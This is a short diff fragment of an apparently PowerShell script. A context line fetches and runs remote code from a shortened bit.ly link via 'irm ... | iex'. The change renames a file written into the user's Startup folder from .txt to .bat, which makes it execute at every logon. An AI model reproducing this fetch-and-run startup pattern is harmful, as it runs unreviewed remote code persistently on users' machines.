@@ -30,4 +30,4 @@ start powershell.exe -Command 'irm bit.ly/kill-wallpaper | iex'
 
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
-Set-Content -Path WallpaperEng.txt -Value $batContent -Encoding ASCII
+Set-Content -Path WallpaperEng.bat -Value $batContent -Encoding ASCII
